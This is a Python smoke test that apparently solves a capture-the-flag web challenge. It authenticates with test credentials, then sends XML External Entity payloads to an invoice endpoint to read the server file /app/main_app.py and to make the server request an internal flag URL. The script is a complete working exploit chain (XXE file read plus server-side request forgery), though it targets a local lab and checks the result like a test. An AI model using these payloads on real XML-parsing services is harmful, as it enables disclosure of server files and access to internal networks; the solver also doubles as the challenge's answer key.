#!/usr/bin/env python3
"""
web-docparser end-to-end smoke test.
Path: /api/auth -> API key -> XXE LFI reads /app/main_app.py to recover INTERNAL_URL
-> XXE SSRF to <INTERNAL_URL>/flag. Exit 0 = PASS.
"""
import os
import re
import sys

import requests

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10003").rstrip("/")


def xxe(api_key, entity_url):
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY x SYSTEM "{entity_url}">
]>
<invoice><vendor>&x;</vendor><amount>1</amount><date>2026-01-01</date></invoice>"""
    r = requests.post(
        f"{TARGET}/api/invoice",
        headers={"X-API-Key": api_key, "Content-Type": "application/xml"},
        data=payload.encode(),
        timeout=10,
    )
    return r.json()


def expected_flag():
    path = os.environ.get("FLAGS_ENV", "")
    if path and os.path.exists(path):
        for line in open(path):
            m = re.match(r"\s*FLAG=(.*)", line)
            if m:
                return m.group(1).strip()
    return None


def solve():
    api_key = requests.post(
        f"{TARGET}/api/auth",
        json={"username": "testuser", "password": "test1234"},
        timeout=10,
    ).json().get("api_key", "")

    src = xxe(api_key, "file:///app/main_app.py").get("vendor", "")
    internal_url = "http://127.0.0.1:7777"
    for line in src.splitlines():
        if "INTERNAL_URL" in line and "environ" in line:
            m = re.search(r"'(http://[^']+)'", line)
            if m:
                internal_url = m.group(1)

    res = xxe(api_key, f"{internal_url}/flag")
    raw = res.get("vendor", "")
    m = re.search(r"(CTF4\{[^}]*\}|ctf4?\{[^}]*\})", raw)
    return m.group(1) if m else raw.strip()


def main():
    got = solve()
    want = expected_flag()
    print(f"[captured] {got!r}")
    if got and (want is None or got == want):
        print("PASS")
        return 0
    print(f"FAIL expected={want!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
